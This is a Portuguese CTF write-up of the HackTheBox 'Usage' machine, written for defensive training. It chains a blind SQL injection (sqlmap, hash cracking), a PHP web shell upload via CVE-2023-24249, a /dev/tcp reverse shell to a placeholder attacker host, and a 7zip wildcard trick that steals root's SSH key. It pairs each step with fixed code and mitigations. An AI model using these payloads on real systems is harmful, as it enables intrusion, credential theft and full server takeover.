# Relatório Técnico de CTF
## HackTheBox "Usage" - SQL Injection + Privilege Escalation

> **Classificação**: Educacional
> **Data**: Janeiro 2025
> **Versão**: 1.0

---

# PARTE I: RESUMO EXECUTIVO

## Destinatários
- CISO e Gerência de Segurança
- Líderes de Desenvolvimento
- Comitê de Riscos

---

## 1. Visão Geral do Exercício

### 1.1 O Que É Este Relatório

Este relatório documenta as vulnerabilidades exploradas em um ambiente de treinamento controlado (HackTheBox), demonstrando técnicas de ataque que podem ser usadas contra aplicações web reais. O objetivo é **educacional** - entender como atacantes pensam para melhorar nossas defesas.

### 1.2 Resumo das Vulnerabilidades Encontradas

```
╔════════════════════════════════════════════════════════════════════════════╗
║                    VULNERABILIDADES IDENTIFICADAS                          ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║   VULNERABILIDADE 1: SQL INJECTION (CRÍTICA)                               ║
║   ┌──────────────────────────────────────────────────────────────────────┐║
║   │ Localização: Funcionalidade de Reset de Senha                        │║
║   │ Tipo: Boolean-based Blind SQL Injection                              │║
║   │ Impacto: Acesso a TODOS os dados do banco de dados                   │║
║   │ CVSS: 9.8 (Crítico)                                                  │║
║   └──────────────────────────────────────────────────────────────────────┘║
║                                                                            ║
║   VULNERABILIDADE 2: UPLOAD ARBITRÁRIO DE ARQUIVOS (ALTA)                 ║
║   ┌──────────────────────────────────────────────────────────────────────┐║
║   │ Localização: Painel Administrativo (Laravel-Admin)                   │║
║   │ CVE: CVE-2023-24249                                                  │║
║   │ Impacto: Execução remota de código no servidor                       │║
║   │ CVSS: 8.8 (Alto)                                                     │║
║   └──────────────────────────────────────────────────────────────────────┘║
║                                                                            ║
║   VULNERABILIDADE 3: WILDCARD INJECTION (ALTA)                             ║
║   ┌──────────────────────────────────────────────────────────────────────┐║
║   │ Localização: Script de backup executado como root                    │║
║   │ Tipo: Privilege Escalation via 7zip wildcard                         │║
║   │ Impacto: Acesso root ao servidor                                     │║
║   │ CVSS: 7.8 (Alto)                                                     │║
║   └──────────────────────────────────────────────────────────────────────┘║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝
```

### 1.3 Impacto para o Negócio

| Vulnerabilidade | Se Explorada em Produção |
|-----------------|-------------------------|
| **SQL Injection** | Vazamento de TODOS os dados de clientes, senhas, informações financeiras |
| **File Upload** | Atacante ganha controle total do servidor web |
| **Privilege Escalation** | Atacante ganha controle de TODO o servidor |

**Custo potencial de um incidente similar: R$ 10-50 milhões** (multas LGPD, resposta a incidente, danos reputacionais)

---

## 2. Cadeia de Ataque Simplificada

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    CADEIA DE ATAQUE COMPLETA                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   PASSO 1: RECONHECIMENTO                                               │
│   ┌─────────────────────────────────────────────────────────────────┐  │
│   │ Atacante identifica:                                             │  │
│   │ • Aplicação web Laravel                                          │  │
│   │ • Funcionalidade de "Esqueci minha senha"                       │  │
│   │ • Painel admin em subdomínio                                     │  │
│   └─────────────────────────────────────────────────────────────────┘  │
│                               │                                        │
│                               ▼                                        │
│   PASSO 2: SQL INJECTION                                                │
│   ┌─────────────────────────────────────────────────────────────────┐  │
│   │ Atacante explora falha no campo de email:                        │  │
│   │ • Extrai lista de usuários                                       │  │
│   │ • Obtém hash da senha do admin                                   │  │
│   │ • Quebra o hash (senha fraca)                                    │  │
│   └─────────────────────────────────────────────────────────────────┘  │
│                               │                                        │
│                               ▼                                        │
│   PASSO 3: ACESSO AO ADMIN                                              │
│   ┌─────────────────────────────────────────────────────────────────┐  │
│   │ Com credenciais do admin:                                        │  │
│   │ • Acessa painel administrativo                                   │  │
│   │ • Encontra funcionalidade de upload de imagem                    │  │
│   │ • Faz upload de arquivo PHP malicioso disfarçado de imagem       │  │
│   └─────────────────────────────────────────────────────────────────┘  │
│                               │                                        │
│                               ▼                                        │
│   PASSO 4: ACESSO AO SERVIDOR                                           │
│   ┌─────────────────────────────────────────────────────────────────┐  │
│   │ Atacante agora tem:                                              │  │
│   │ • Shell no servidor (usuário web)                                │  │
│   │ • Acesso a arquivos do sistema                                   │  │
│   │ • Flag do primeiro usuário                                       │  │
│   └─────────────────────────────────────────────────────────────────┘  │
│                               │                                        │
│                               ▼                                        │
│   PASSO 5: ESCALAÇÃO DE PRIVILÉGIOS                                     │
│   ┌─────────────────────────────────────────────────────────────────┐  │
│   │ Atacante descobre script de backup com privilégios root:         │  │
│   │ • Explora wildcard injection no 7zip                             │  │
│   │ • Obtém acesso root completo                                     │  │
│   │ • Controle TOTAL do servidor                                     │  │
│   └─────────────────────────────────────────────────────────────────┘  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Lições para Nossa Organização

### 3.1 Vulnerabilidades que Devemos Verificar

| Vulnerabilidade | Onde Verificar em Nossos Sistemas | Responsável |
|-----------------|----------------------------------|-------------|
| SQL Injection | Todos os formulários de input, APIs | Dev + AppSec |
| File Upload | Qualquer funcionalidade de upload | Dev + AppSec |
| Privilege Escalation | Scripts rodando como root, sudo rules | Infra + SecOps |

### 3.2 Recomendações Imediatas

```
┌─────────────────────────────────────────────────────────────────────────┐
│              AÇÕES RECOMENDADAS PARA LIDERANÇA                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  IMEDIATO (Esta Semana)                                                 │
│  ──────────────────────                                                 │
│  ☐ Verificar se usamos Laravel e se está atualizado                    │
│  ☐ Auditar funcionalidades de "Esqueci minha senha"                    │
│  ☐ Revisar todas as funcionalidades de upload de arquivo               │
│                                                                         │
│  CURTO PRAZO (30 dias)                                                  │
│  ─────────────────────                                                  │
│  ☐ Executar scan de vulnerabilidades (DAST) em aplicações web          │
│  ☐ Revisar scripts que rodam com privilégios elevados                  │
│  ☐ Implementar WAF se não existente                                    │
│                                                                         │
│  MÉDIO PRAZO (90 dias)                                                  │
│  ──────────────────────                                                 │
│  ☐ Pentest externo em aplicações críticas                              │
│  ☐ Treinamento de secure coding para desenvolvedores                   │
│  ☐ Implementar SAST no pipeline de CI/CD                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Investimento em Prevenção

### 4.1 Custo de Prevenção vs. Custo de Incidente

```
ANÁLISE DE CUSTO-BENEFÍCIO

CUSTO DE PREVENÇÃO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌────────────────────────────────────────────────────────────┐
│ WAF (Web Application Firewall)         ~R$ 100,000/ano    │
│ SAST/DAST no CI/CD                     ~R$ 80,000/ano     │
│ Pentest anual                          ~R$ 150,000        │
│ Treinamento de desenvolvedores         ~R$ 50,000         │
│ ──────────────────────────────────────────────────────────│
│ TOTAL                                  ~R$ 380,000/ano    │
└────────────────────────────────────────────────────────────┘

CUSTO DE INCIDENTE SIMILAR
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌────────────────────────────────────────────────────────────┐
│ Resposta a incidente                   ~R$ 500,000        │
│ Multas LGPD (até 2%)                   ~R$ 10,000,000     │
│ Notificação de clientes                ~R$ 200,000        │
│ Dano reputacional                      INCALCULÁVEL       │
│ ──────────────────────────────────────────────────────────│
│ TOTAL MÍNIMO                           ~R$ 10,700,000     │
└────────────────────────────────────────────────────────────┘

ROI DE PREVENÇÃO: 2.700%+
```

---

# PARTE II: RELATÓRIO TÉCNICO

## Destinatários
- Time de Segurança (AppSec, SecOps)
- Desenvolvedores Sênior
- Arquitetos de Software
- Time de Infraestrutura

---

## 1. Detalhes Técnicos das Vulnerabilidades

### 1.1 SQL Injection - Análise Completa

#### 1.1.1 Localização e Contexto

| Aspecto | Detalhe |
|---------|---------|
| **URL** | `POST /forgot-password` |
| **Parâmetro** | `email` |
| **Framework** | Laravel (PHP) |
| **Tipo** | Boolean-based Blind SQL Injection |
| **Backend** | MySQL |

#### 1.1.2 Código Vulnerável (Hipotético)

```php
// CÓDIGO VULNERÁVEL - NÃO FAZER ISSO
public function forgotPassword(Request $request)
{
    $email = $request->input('email');

    // Concatenação direta - VULNERÁVEL
    $user = DB::select("SELECT * FROM users WHERE email = '$email'");

    if ($user) {
        return response()->json(['message' => 'Reset link sent']);
    }
    return response()->json(['error' => 'User not found'], 404);
}
```

#### 1.1.3 Exploração Passo a Passo

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    EXPLORAÇÃO SQL INJECTION                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PASSO 1: DETECÇÃO                                                          │
│  ─────────────────                                                          │
│  Payload: test'@test.com                                                    │
│  Resposta: HTTP 500 Internal Server Error                                   │
│  Conclusão: Possível SQL Injection                                         │
│                                                                             │
│  PASSO 2: CONFIRMAÇÃO                                                       │
│  ──────────────────                                                         │
│  Payload TRUE:  test' OR '1'='1'-- -@test.com                              │
│  Resposta: "Reset link sent" (TRUE)                                        │
│                                                                             │
│  Payload FALSE: test' OR '1'='2'-- -@test.com                              │
│  Resposta: "User not found" (FALSE)                                        │
│  Conclusão: Boolean-based Blind SQL Injection CONFIRMADO                   │
│                                                                             │
│  PASSO 3: EXTRAÇÃO DE DADOS (SQLMap)                                        │
│  ────────────────────────────────────                                       │
│  $ sqlmap -r request.txt --batch --dbs                                     │
│                                                                             │
│  Databases encontrados:                                                     │
│  • information_schema                                                       │
│  • usage_blog                                                               │
│                                                                             │
│  $ sqlmap -r request.txt --batch -D usage_blog --tables                    │
│                                                                             │
│  Tabelas encontradas:                                                       │
│  • admin_users  <-- ALVO                                                   │
│  • users                                                                    │
│  • posts                                                                    │
│  • ...                                                                      │
│                                                                             │
│  $ sqlmap -r request.txt --batch -D usage_blog -T admin_users --dump       │
│                                                                             │
│  Dados extraídos:                                                           │
│  +----+---------------+-------------------------------+                     │
│  | id | username      | password (hash)               |                     │
│  +----+---------------+-------------------------------+                     │
│  | 1  | admin         | $2y$10$ohq2k... (bcrypt)     |                     │
│  +----+---------------+-------------------------------+                     │
│                                                                             │
│  PASSO 4: QUEBRA DO HASH                                                    │
│  ────────────────────────                                                   │
│  $ hashcat -m 3200 hash.txt rockyou.txt                                    │
│  Resultado: admin:whatever1                                                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 1.1.4 Código Corrigido

```php
// CÓDIGO CORRIGIDO - Usar Prepared Statements
public function forgotPassword(Request $request)
{
    // Validação de entrada
    $request->validate([
        'email' => 'required|email|max:255'
    ]);

    $email = $request->input('email');

    // Eloquent ORM (automaticamente usa prepared statements)
    $user = User::where('email', $email)->first();

    // Ou Query Builder com binding
    // $user = DB::table('users')->where('email', '=', $email)->first();

    // Resposta genérica (não revela se usuário existe)
    return response()->json([
        'message' => 'If the email exists, a reset link will be sent'
    ]);
}
```

#### 1.1.5 Controles de Mitigação

| Controle | Descrição | Prioridade |
|----------|-----------|------------|
| **Prepared Statements** | SEMPRE usar binding de parâmetros | P0 |
| **ORM** | Usar Eloquent/Doctrine ao invés de queries raw | P0 |
| **Input Validation** | Validar formato de email antes de processar | P1 |
| **WAF** | Bloquear payloads conhecidos de SQLi | P1 |
| **Least Privilege DB** | Usuário de app com permissões mínimas | P1 |
| **Error Handling** | Não revelar erros de SQL ao usuário | P2 |

---

### 1.2 Arbitrary File Upload - CVE-2023-24249

#### 1.2.1 Detalhes da Vulnerabilidade

| Aspecto | Detalhe |
|---------|---------|
| **CVE** | CVE-2023-24249 |
| **Componente** | Laravel-Admin <= 1.8.19 |
| **URL** | `POST /admin/auth/setting` |
| **Tipo** | Arbitrary File Upload |
| **CVSS** | 8.8 (Alto) |

#### 1.2.2 Exploração

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    EXPLORAÇÃO FILE UPLOAD                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PASSO 1: ACESSO AO ADMIN                                                   │
│  ────────────────────────                                                   │
│  URL: http://admin.usage.htb/admin/auth/login                              │
│  Credenciais: admin:whatever1 (obtidas via SQLi)                           │
│                                                                             │
│  PASSO 2: IDENTIFICAR UPLOAD                                                │
│  ───────────────────────────                                                │
│  Funcionalidade: Alterar foto de perfil                                    │
│  URL: /admin/auth/setting                                                   │
│                                                                             │
│  PASSO 3: PREPARAR PAYLOAD                                                  │
│  ─────────────────────────                                                  │
│  Arquivo: shell.php                                                         │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ <?php system($_GET['cmd']); ?>                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  PASSO 4: BYPASS DE VALIDAÇÃO                                               │
│  ────────────────────────────                                               │
│  Técnica: Renomear para shell.php.jpg                                      │
│  Interceptar request no Burp e modificar:                                  │
│  • Mudar Content-Type para image/jpeg                                      │
│  • Mudar filename para shell.php                                           │
│                                                                             │
│  Request modificado:                                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ Content-Disposition: form-data; name="avatar"; filename="shell.php" │   │
│  │ Content-Type: image/jpeg                                             │   │
│  │                                                                      │   │
│  │ <?php system($_GET['cmd']); ?>                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  PASSO 5: EXECUÇÃO                                                          │
│  ─────────────────                                                          │
│  URL: http://usage.htb/uploads/images/shell.php?cmd=id                     │
│  Resposta: uid=33(www-data) gid=33(www-data) groups=33(www-data)          │
│                                                                             │
│  PASSO 6: REVERSE SHELL                                                     │
│  ──────────────────────                                                     │
│  URL: /shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'     │
│  Atacante recebe shell como www-data                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 1.2.3 Código Corrigido

```php
// VALIDAÇÃO SEGURA DE UPLOAD
public function updateAvatar(Request $request)
{
    // 1. Validação rigorosa
    $request->validate([
        'avatar' => [
            'required',
            'file',
            'image',  // Valida magic bytes, não apenas extensão
            'mimes:jpeg,png,gif',
            'max:2048',  // 2MB max
        ]
    ]);

    $file = $request->file('avatar');

    // 2. Gerar nome aleatório (nunca usar nome original)
    $filename = Str::uuid() . '.jpg';

    // 3. Reprocessar imagem (remove código malicioso)
    $image = Image::make($file)->fit(200, 200)->encode('jpg', 75);

    // 4. Salvar em diretório sem execução
    Storage::disk('avatars')->put($filename, $image);

    // 5. Configurar servidor para não executar PHP em /uploads
    // nginx: location /uploads { add_header Content-Type image/jpeg; }

    return response()->json(['filename' => $filename]);
}
```

#### 1.2.4 Controles de Mitigação

| Controle | Descrição | Prioridade |
|----------|-----------|------------|
| **Validação de Magic Bytes** | Verificar tipo real do arquivo, não extensão | P0 |
| **Reprocessamento** | Recriar imagem para remover código embutido | P0 |
| **Diretório sem Execução** | Configurar servidor para não executar scripts | P0 |
| **Nome Aleatório** | Nunca usar nome original do arquivo | P1 |
| **Limite de Tamanho** | Restringir tamanho máximo do upload | P1 |
| **Armazenamento Externo** | Usar S3/CDN ao invés de filesystem local | P2 |

---

### 1.3 Privilege Escalation - Wildcard Injection

#### 1.3.1 Detalhes da Vulnerabilidade

| Aspecto | Detalhe |
|---------|---------|
| **Localização** | Script de backup `/usr/local/bin/backup.sh` |
| **Execução** | Via sudo como root |
| **Tipo** | Wildcard Injection em 7zip |
| **Pré-requisito** | Acesso como usuário local |

#### 1.3.2 Script Vulnerável

```bash
#!/bin/bash
# /usr/local/bin/backup.sh - VULNERÁVEL

cd /var/www/html
7za a /backups/backup.zip *
```

O problema: O `*` expande wildcards, e 7zip interpreta arquivos começando com `@` como arquivo de lista.

#### 1.3.3 Exploração

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    EXPLORAÇÃO WILDCARD INJECTION                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PASSO 1: DESCOBERTA                                                        │
│  ───────────────────                                                        │
│  $ sudo -l                                                                  │
│  User www-data may run:                                                     │
│      (root) NOPASSWD: /usr/local/bin/backup.sh                             │
│                                                                             │
│  $ cat /usr/local/bin/backup.sh                                            │
│  #!/bin/bash                                                                │
│  cd /var/www/html                                                           │
│  7za a /backups/backup.zip *                                               │
│                                                                             │
│  PASSO 2: PREPARAR PAYLOAD                                                  │
│  ─────────────────────────                                                  │
│  # 7zip interpreta @arquivo como lista de arquivos                         │
│  # Podemos fazer ele ler arquivos arbitrários                               │
│                                                                             │
│  $ cd /var/www/html                                                         │
│                                                                             │
│  # Criar arquivo de lista apontando para chave SSH do root                 │
│  $ echo "/root/.ssh/id_rsa" > @getkey                                      │
│                                                                             │
│  PASSO 3: EXECUTAR                                                          │
│  ─────────────────                                                          │
│  $ sudo /usr/local/bin/backup.sh                                           │
│                                                                             │
│  O 7za interpretará @getkey como lista e incluirá                          │
│  /root/.ssh/id_rsa no backup                                               │
│                                                                             │
│  PASSO 4: EXTRAIR CHAVE                                                     │
│  ──────────────────────                                                     │
│  $ 7za x /backups/backup.zip                                               │
│  $ cat root/.ssh/id_rsa                                                     │
│  -----BEGIN RSA PRIVATE KEY-----                                           │
│  MIIEowI...                                                                 │
│  -----END RSA PRIVATE KEY-----                                             │
│                                                                             │
│  PASSO 5: ACESSO ROOT                                                       │
│  ────────────────────                                                       │
│  $ chmod 600 id_rsa                                                        │
│  $ ssh -i id_rsa root@localhost                                            │
│  root@usage:~# whoami                                                       │
│  root                                                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 1.3.4 Script Corrigido

```bash
#!/bin/bash
# /usr/local/bin/backup.sh - CORRIGIDO

cd /var/www/html

# Usar find para listar arquivos (evita wildcard injection)
find . -type f -print0 | xargs -0 7za a /backups/backup.zip

# OU usar -- para indicar fim das opções
# 7za a /backups/backup.zip -- $(find . -type f)

# OU melhor: especificar arquivos explicitamente
# 7za a /backups/backup.zip ./index.php ./app/ ./config/
```

#### 1.3.5 Controles de Mitigação

| Controle | Descrição | Prioridade |
|----------|-----------|------------|
| **Evitar Wildcards** | Usar find ou especificar arquivos | P0 |
| **Princípio do Menor Privilégio** | Script não deve rodar como root | P0 |
| **Validação de Entrada** | Verificar nomes de arquivos | P1 |
| **Auditoria de sudo** | Revisar regras sudo regularmente | P1 |
| **Diretório Restrito** | Backup de diretório sem arquivos user-controlled | P2 |

---

## 2. Mapeamento MITRE ATT&CK

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MAPEAMENTO MITRE ATT&CK                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  TÁTICA              TÉCNICA                    ID        FASE              │
│  ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│  Reconnaissance      Active Scanning            T1595     Reconhecimento   │
│                      Vulnerability Scanning     T1595.002                   │
│                                                                             │
│  Initial Access      Exploit Public App        T1190     SQL Injection    │
│                                                                             │
│  Credential Access   Credentials from Password T1555     Hash Cracking    │
│                      Stores                                                 │
│                                                                             │
│  Persistence         Web Shell                  T1505.003 File Upload      │
│                                                                             │
│  Privilege           Exploitation for          T1068     Wildcard         │
│  Escalation          Privilege Escalation                Injection        │
│                                                                             │
│  Collection          Data from Local System    T1005     Post-Exploit     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Checklist de Verificação para Nossa Organização

### 3.1 SQL Injection

```
☐ Todas as queries usam prepared statements/ORM?
☐ Input validation em todos os formulários?
☐ WAF configurado para bloquear SQLi?
☐ Usuário de banco com least privilege?
☐ Scan DAST regular em execução?
```

### 3.2 File Upload

```
☐ Validação de magic bytes (não apenas extensão)?
☐ Reprocessamento de imagens/arquivos?
☐ Diretório de upload sem permissão de execução?
☐ Nomes de arquivo gerados aleatoriamente?
☐ Limite de tamanho de upload?
```

### 3.3 Privilege Escalation

```
☐ Scripts com sudo auditados?
☐ Evitados wildcards em scripts root?
☐ Princípio do menor privilégio aplicado?
☐ Configuração de sudo revisada?
☐ Monitoramento de comandos privilegiados?
```

---

## 4. Ferramentas Utilizadas e Alternativas

| Fase | Ferramenta Usada | Alternativas | Propósito |
|------|-----------------|--------------|-----------|
| Reconhecimento | Nmap | Masscan, RustScan | Port scanning |
| Web Enum | Gobuster | Dirsearch, FFuF | Dir bruteforce |
| SQLi | SQLMap | Manual, Burp | SQL Injection automation |
| Hash Cracking | Hashcat | John the Ripper | Password cracking |
| Web Proxy | Burp Suite | OWASP ZAP, mitmproxy | Request interception |
| Shell | Netcat | Pwncat, Socat | Reverse shell |

---

## 5. Conclusão e Recomendações

### 5.1 Resumo de Vulnerabilidades

| Vulnerabilidade | CVSS | Complexidade | Impacto |
|-----------------|------|--------------|---------|
| SQL Injection | 9.8 | Baixa | Vazamento total de dados |
| File Upload | 8.8 | Média | RCE no servidor |
| Wildcard Injection | 7.8 | Média | Acesso root |

### 5.2 Prioridades de Remediação

1. **P0 - Imediato**: Auditar código para SQL Injection e File Upload
2. **P1 - 7 dias**: Implementar WAF, revisar scripts sudo
3. **P2 - 30 dias**: Pentest completo, treinamento de desenvolvedores

### 5.3 Valor do Exercício

Este tipo de exercício (CTF) oferece:
- Visão real de como atacantes operam
- Identificação proativa de vulnerabilidades
- Treinamento prático para time de segurança
- Validação de controles existentes

**Recomendação**: Participar regularmente de CTFs e contratar Red Team anual.

---

*Relatório elaborado para fins educacionais - MBA Cibersegurança & IA*
